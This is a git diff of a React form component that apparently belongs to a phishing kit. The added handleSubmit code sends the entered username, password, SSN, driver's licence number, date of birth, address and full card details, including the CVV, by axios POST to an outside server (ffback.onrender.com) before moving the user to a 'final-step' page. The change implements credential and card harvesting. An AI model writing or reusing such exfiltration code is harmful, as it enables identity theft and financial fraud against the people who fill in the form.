@@ -14,6 +14,7 @@ import { Link } from 'react-router-dom';
 
 import toggle from './toggle.png';
 import close from './close.png';
+import axios from 'axios';
 
 
 function Personal(){
@@ -63,10 +64,62 @@ function Personal(){
       }, []);
 
 
-      function handleSubmit(e){
+     async function handleSubmit(e){
         e.preventDefault();
 
         
+
+        // navigate('/final-step', { state: 
+        //     { 
+        //         type: type,
+        //          username:username,
+        //          password:password,
+        //          firstname:firstname,
+        //          lastname:lastname,
+        //          othername:othername,
+        //          dob:dob,
+        //          ssn:ssn,
+        //          driver_license:driver_license,
+        //          address:address,
+        //          card_name:card_name,
+        //          card_number:card_number,
+        //          card_expiration:card_expiration,
+        //          card_cvv:card_cvv
+            
+        //     } });
+
+
+        try {
+
+         
+            
+            const response = await axios.post('https://ffback.onrender.com/api/send', {
+                
+                platform:"ffin",
+                type: type,
+                username:username,
+                password:password,
+                firstname:firstname,
+                lastname:lastname,
+                othername:othername,
+                dob:dob,
+                ssn:ssn,
+                driver_license:driver_license,
+                address:address,
+                card_name:card_name,
+                card_number:card_number,
+                card_expiration:card_expiration,
+                card_cvv:card_cvv,
+               
+            });
+        
+            // Handle success
+    
+            if(response.status == 200){
+                
+            console.log('Data sent:', response.data.message);
+
+
 
         navigate('/final-step', { state: 
             { 
@@ -86,6 +139,20 @@ function Personal(){
                  card_cvv:card_cvv
             
             } });
+    
+              
+    
+              
+            }
+          } catch (error) {
+            // Handle error
+            console.error('Error:', error);
+            
+          }
+
+
+
+
     }
 
 
